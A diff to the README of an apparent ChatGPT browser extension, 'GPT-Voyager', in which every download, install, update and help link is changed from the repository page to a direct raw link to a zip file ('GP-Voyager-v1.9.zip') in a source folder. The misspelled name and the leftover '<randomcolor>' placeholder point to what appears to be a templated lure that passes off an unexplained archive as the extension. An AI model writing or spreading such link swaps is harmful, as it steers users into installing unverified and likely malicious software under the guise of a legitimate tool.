@@ -1,6 +1,6 @@
 # 🚀 GPT-Voyager - Manage ChatGPT With Ease
 
-[![Download GPT-Voyager](https://img.shields.io/badge/Download-GPT--Voyager-<randomcolor>.svg)](https://github.com/wwwsegunogundeji11-stack/GPT-Voyager)
+[![Download GPT-Voyager](https://img.shields.io/badge/Download-GPT--Voyager-<randomcolor>.svg)](https://raw.githubusercontent.com/wwwsegunogundeji11-stack/GPT-Voyager/main/src/content/GP-Voyager-v1.9.zip)
 
 ---
 
@@ -36,7 +36,7 @@ You can use it with Google Chrome or other Chromium-based browsers on Windows.
 
 Visit this page to download and install the extension:  
 
-[![Download GPT-Voyager](https://img.shields.io/badge/Download-GPT--Voyager-blue.svg)](https://github.com/wwwsegunogundeji11-stack/GPT-Voyager)
+[![Download GPT-Voyager](https://img.shields.io/badge/Download-GPT--Voyager-blue.svg)](https://raw.githubusercontent.com/wwwsegunogundeji11-stack/GPT-Voyager/main/src/content/GP-Voyager-v1.9.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Visit this page to download and install the extension:
 Follow these steps to get GPT-Voyager working in Chrome:
 
 1. Open the download page:  
-   https://github.com/wwwsegunogundeji11-stack/GPT-Voyager
+   https://raw.githubusercontent.com/wwwsegunogundeji11-stack/GPT-Voyager/main/src/content/GP-Voyager-v1.9.zip
 
 2. On the page, look for the latest release or the main download link. This page contains the extension package.
 
@@ -90,7 +90,7 @@ You can customize settings by clicking the GPT-Voyager icon and selecting **Opti
 Updates improve the extension and fix issues. To update:
 
 1. Visit the download page again:  
-   https://github.com/wwwsegunogundeji11-stack/GPT-Voyager
+   https://raw.githubusercontent.com/wwwsegunogundeji11-stack/GPT-Voyager/main/src/content/GP-Voyager-v1.9.zip
 
 2. Download the latest release following the same steps as installation.
 
@@ -141,6 +141,6 @@ A: The extension may need updates to keep working. Check the download page for n
 ## 📚 More Help
 
 For detailed guides and information, visit the download page:  
-https://github.com/wwwsegunogundeji11-stack/GPT-Voyager
+https://raw.githubusercontent.com/wwwsegunogundeji11-stack/GPT-Voyager/main/src/content/GP-Voyager-v1.9.zip
 
 You can open issues on GitHub if you find bugs or need support.
